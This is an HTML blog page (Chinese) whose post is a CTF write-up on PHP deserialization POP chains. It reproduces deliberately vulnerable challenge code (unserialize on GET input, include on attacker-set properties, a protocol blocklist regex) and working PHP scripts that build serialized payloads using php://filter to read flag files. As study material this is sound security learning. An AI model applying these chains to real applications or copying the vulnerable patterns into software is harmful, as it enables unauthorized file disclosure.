@@ -1,0 +1,868 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言随着对反序列化学习的不断深入，并且在最近的nkctf和鲲鹏杯测试平台中都有所涉及，所以来学习一下pop链的构造。 魔术方法  __construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用__i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pop链">
+<meta property="og:url" content="http://example.com/2023/04/08/pop%E9%93%BE/index.html">
+<meta property="og:site_name" content="你也喜欢柯基吗">
+<meta property="og:description" content="前言随着对反序列化学习的不断深入，并且在最近的nkctf和鲲鹏杯测试平台中都有所涉及，所以来学习一下pop链的构造。 魔术方法  __construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用__i">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-04-08T14:18:54.000Z">
+<meta property="article:modified_time" content="2023-04-12T12:49:11.584Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>pop链 - 你也喜欢柯基吗</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>你也喜欢柯基吗</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="pop链"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-08 22:18" pubdate>
+          2023年4月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          55 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">pop链</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着对反序列化学习的不断深入，并且在最近的nkctf和鲲鹏杯测试平台中都有所涉及，所以来学习一下pop链的构造。</p>
+<p><strong>魔术方法</strong></p>
+<blockquote>
+<p>__construct(): &#x2F;&#x2F;构造函数，当对象new的时候会自动调用<br>__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用<br>__wakeup(): &#x2F;&#x2F;unserialize()时会被自动调用<br>__invoke(): &#x2F;&#x2F;当尝试以调用函数的方法调用一个对象时，会被自动调用<br>__call(): &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发<br>__callStatci(): &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发<br>__get(): &#x2F;&#x2F;用于从不可访问的属性读取数据<br>__set(): &#x2F;&#x2F;用于将数据写入不可访问的属性<br>__isset(): &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发<br>__unset(): &#x2F;&#x2F;在不可访问的属性上使用unset()时触发<br>__toString(): &#x2F;&#x2F;把类当作字符串使用时触发<br>__sleep(): &#x2F;&#x2F;serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</p>
+</blockquote>
+<p><strong>pop链构造</strong><br>一般的反序列化题目，存在漏洞或者能注入恶意代码的地方在魔术方法中，我们可以通过自动调用魔术方法来达到攻击效果。但是当注入点存在普通的类方法中，通过前面自动调用的方法就失效了，所以我们需要找到普通类与魔术方法之间的联系，理出一种逻辑思路，通过这种逻辑思路来构造一条pop链，从而达到攻击的目的。所以我们在做这类pop题目一定要紧盯魔术方法。<br><em>ps：简单来说就是解决反序列化题目的一种方法</em><br>直接上题目吧</p>
+<h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><pre><code class="hljs">Welcome to index.php
+&lt;?php
+//flag is in flag.php
+//WTF IS THIS?
+//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
+//And Crack It!
+class Modifier &#123;
+    protected  $var;
+    public function append($value)&#123;
+        include($value);
+    &#125;
+    public function __invoke()&#123;
+        $this-&gt;append($this-&gt;var);
+    &#125;
+&#125;
+
+class Show&#123;
+    public $source;
+    public $str;
+    public function __construct($file=&#39;index.php&#39;)&#123;
+        $this-&gt;source = $file;
+        echo &#39;Welcome to &#39;.$this-&gt;source.&quot;&lt;br&gt;&quot;;
+    &#125;
+    public function __toString()&#123;
+        return $this-&gt;str-&gt;source;
+    &#125;
+
+    public function __wakeup()&#123;
+        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;
+            echo &quot;hacker&quot;;
+            $this-&gt;source = &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+
+class Test&#123;
+    public $p;
+    public function __construct()&#123;
+        $this-&gt;p = array();
+    &#125;
+
+    public function __get($key)&#123;
+        $function = $this-&gt;p;
+        return $function();
+    &#125;
+&#125;
+
+if(isset($_GET[&#39;pop&#39;]))&#123;
+    @unserialize($_GET[&#39;pop&#39;]);
+&#125;
+else&#123;
+    $a=new Show;
+    highlight_file(__FILE__);
+&#125; 
+</code></pre>
+<p><strong>构造思路</strong><br>在构造调用链时，先找到调用链的头和尾。头一般都是能传参以及可以反序列化的地方，而尾部一般都是可以执行恶意代码的地方。审计这个题的代码，头是用get方式对pop传参，而尾部是include包含函数。到这里，我们应该都知道是要用php伪协议读取flag文件的源码。既然头和尾都找到了，也知道了攻击方法。那么接下来找到题目中的魔术方法。</p>
+<blockquote>
+<p>__invoke()    当一个类被当作函数执行时调用此方法。<br>__construct   在创建对象时调用此方法<br>__toString()  在一个类被当作字符串处理时调用此方法<br>__wakeup()    当反序列化恢复成对象时调用此方法<br>__get()       当读取不可访问或不存在的属性的值会被调用</p>
+</blockquote>
+<p><strong>构造pop链</strong><br><?php
+class Modifier {
+    protected $var='php://filter/convert.base64-encode/resource=flag.php';
+}
+class Show{
+    public $source;
+    public $str;
+    function _construct(){
+        $this->source=$file;
+    }
+}
+class Test{
+    public $p;
+}
+$a = new show();
+$b = new show();
+$c = new test();
+$d = new Modifier();
+$a->source=$b;
+$b->str=$c;
+$c->p= $d;
+echo urlencode(serialize($a));
+?><br>先把用到的类写出来，形成一个框架，再表明类中的变量。分别将用到的类进行实例化，这里为什么要new 两次show（看代码应该能看懂，第一次是实例化show类,第二次是将第一次实例化后的show类中的source&#x3D;第二次实例化的show）</p>
+<p>在我们进行序列化的时候尽量用url编码一下（在这个题中有protected修饰的属性，会有不可见字符）</p>
+<p>得到一个base64编码，解码得到flag</p>
+<h1 id="鲲鹏杯测试平台-babypop"><a href="#鲲鹏杯测试平台-babypop" class="headerlink" title="[鲲鹏杯测试平台]babypop"></a>[鲲鹏杯测试平台]babypop</h1><pre><code class="hljs">&lt;?php
+
+error_reporting(0);
+show_source(&quot;index.php&quot;);
+
+class A&#123;
+
+    private $admin = &#39;YJYX&#39;;
+    protected $passwd = &#39;810975&#39;;
+
+    public function Getflag()&#123;
+        if($this-&gt;admin === &#39;DingZhen&#39; &amp;&amp; $this-&gt;passwd ===&#39;1376666&#39;)&#123;
+            include(&#39;flag.php&#39;);
+            echo $flag;
+        &#125;else&#123;
+            echo $this-&gt;admin;
+            echo $this-&gt;passwd;
+            echo &#39;nono&#39;;
+        &#125;
+    &#125;
+&#125;
+
+class B&#123;
+    public $a;
+    public function __destruct()&#123;
+        echo $this-&gt;a;
+    &#125;
+&#125;
+
+class C&#123;
+    public $a;
+    public $b;
+    public function __toString()&#123;
+        $this-&gt;a-&gt;&#123;$this-&gt;b&#125;();
+        return 0;
+    &#125;
+&#125;
+
+$unser = $_GET[&#39;cmd&#39;];
+unserialize($unser);
+
+?&gt;
+</code></pre>
+<p>魔术方法</p>
+<blockquote>
+<p>__destruct()：&#x2F;&#x2F;析构函数当对象被销毁时会被自动调用<br>__toString(): &#x2F;&#x2F;把类当作字符串使用时触发</p>
+</blockquote>
+<p>这题提示我们A类的admin&#x3D;’DingZhen’，passwd&#x3D;’1376666’，并且flag包含在Getflag函数中，我们需要引用他，我们可以从B开始构建pop链</p>
+<pre><code class="hljs">&lt;?php
+class A&#123;
+
+    private $admin = &#39;DingZhen&#39;;
+    protected $passwd =&#39;1376666&#39;;
+&#125;
+
+class B&#123;
+    public $a;
+
+&#125;
+
+class C&#123;
+    public $a;
+    public $b;
+
+&#125;
+$a=new A;
+$b=new B;
+$c=new C;
+$b-&gt;a=$c;
+$c-&gt;a=$a;
+$c-&gt;b=&quot;Getflag&quot;;
+echo urlencode(serialize($b))
+?&gt; 
+</code></pre>
+<p> 这题和**[SWPUCTF 2021 新生赛]pop**这题是一样的</p>
+<h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><pre><code class="hljs">Happy New Year~ MAKE A WISH
+&lt;?php
+
+echo &#39;Happy New Year~ MAKE A WISH&lt;br&gt;&#39;;
+
+if(isset($_GET[&#39;wish&#39;]))&#123;
+    @unserialize($_GET[&#39;wish&#39;]);
+&#125;
+else&#123;
+    $a=new Road_is_Long;
+    highlight_file(__FILE__);
+&#125;
+/***************************pop your 2022*****************************/
+
+class Road_is_Long&#123;
+    public $page;
+    public $string;
+    public function __construct($file=&#39;index.php&#39;)&#123;
+        $this-&gt;page = $file;
+    &#125;
+    public function __toString()&#123;
+        return $this-&gt;string-&gt;page;
+    &#125;
+
+    public function __wakeup()&#123;
+        if(preg_match(&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;, $this-&gt;page)) &#123;
+            echo &quot;You can Not Enter 2022&quot;;
+            $this-&gt;page = &quot;index.php&quot;;
+        &#125;
+    &#125;
+&#125;
+
+class Try_Work_Hard&#123;
+    protected  $var;
+    public function append($value)&#123;
+        include($value);
+    &#125;
+    public function __invoke()&#123;
+        $this-&gt;append($this-&gt;var);
+    &#125;
+&#125;
+
+class Make_a_Change&#123;
+    public $effort;
+    public function __construct()&#123;
+        $this-&gt;effort = array();
+    &#125;
+
+    public function __get($key)&#123;
+        $function = $this-&gt;effort;
+        return $function();
+    &#125;
+&#125;
+/**********************Try to See flag.php*****************************/
+</code></pre>
+<p>越做越感觉做过这题，好像和第一题差不多<br>区别只是这个flag在&#x2F;flag里面，不是在flag.php</p>
+<p>其他博主的详解（自己描述不清楚，QAQ）<br>从Try_Work_Hard类的append方法往上爬，首先append方法需要__invoke触发，这里我们可以知道我们可以直接对$var进行赋值，__invoke()需要以调用函数的方式调用一个对象。<br>在Make_a_Change类的__get中我们可以发现他是触发了__invoke()，__get方法需要访问了不可直接访问的值才会触发，往上看。<br>在Road_is_Long类中__toString中会触发__get，有的人会疑惑page和string属性不都是公共的吗，这是不对的，string中没有page这个属性呀，所以调用tostring相当于从不可访问的属性中读取数据，所以get被触发。只有给string new成road is long的，他才会有page属性列如这样$a&#x3D; new road_is_long();$a-&gt;string&#x3D;new road_is_long();<br>然后是如何触发Road_is_Long类中的__toString，通过观察发现在__wakeup魔法函数中，对page属性进行了正则匹配，匹配里有没有被过滤的字符，这时的page是作为字符串被操作的，所以触发了__toString，然后__wakeup会在外部使用unserialize时触发，然后我们通过GET的方式通过wish传入，进行反序列化，然后unserialzie是在外部的，这样一条完整的链子就有了</p>
+<p><strong>构造pop链</strong></p>
+<pre><code class="hljs">&lt;?php
+class Road_is_Long&#123;
+    public $page;
+    public $string;
+    public function __construct($file=&#39;index.php&#39;)&#123;
+        $this-&gt;page = $file;
+    &#125;
+&#125;
+
+class Try_Work_Hard&#123;
+    protected  $var=&#39;php://filter/read=convert.base64-encode/resource=/flag&#39;;
+
+&#125;
+
+class Make_a_Change&#123;
+    public $effort;
+
+&#125; 
+$a=new Road_is_Long;
+$b=new Try_Work_Hard;
+$c=new Make_a_Change;
+$d=new Road_is_Long;
+$a-&gt;page=$d;
+$d-&gt;string=$c;
+$c-&gt;effort=$b;
+echo urlencode(serialize($a));
+?&gt;
+</code></pre>
+<p>因为是&#x2F;flag，后面经过尝试，发现不用伪协议也可以</p>
+<pre><code class="hljs">&lt;?php
+class Road_is_Long&#123;
+    public $page;
+    public $string;
+    public function __construct($file=&#39;index.php&#39;)&#123;
+        $this-&gt;page = $file;
+    &#125;
+&#125;
+
+class Try_Work_Hard&#123;
+    protected  $var=&#39;/flag&#39;;
+
+&#125;
+
+class Make_a_Change&#123;
+    public $effort;
+
+&#125; 
+$a=new Road_is_Long;
+$b=new Try_Work_Hard;
+$c=new Make_a_Change;
+$d=new Road_is_Long;
+$a-&gt;page=$d;
+$d-&gt;string=$c;
+$c-&gt;effort=$b;
+echo urlencode(serialize($a));
+?&gt;
+</code></pre>
+<p>又回去把[MRCTF2020]Ezpop做了一遍，发现只能用伪协议，懵懵的</p>
+<h1 id="UUCTF-2022-新生赛-ezpop"><a href="#UUCTF-2022-新生赛-ezpop" class="headerlink" title="[UUCTF 2022 新生赛]ezpop"></a>[UUCTF 2022 新生赛]ezpop</h1><p>看看反序列化字符串逃逸或许有点帮助     </p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>pop链</div>
+      <div>http://example.com/2023/04/08/pop链/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/16/Crypto/" title="AES（对称加密）">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">AES（对称加密）</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/07/RSA/" title="RSA(非对称加密)">
+                        <span class="hidden-mobile">RSA(非对称加密)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
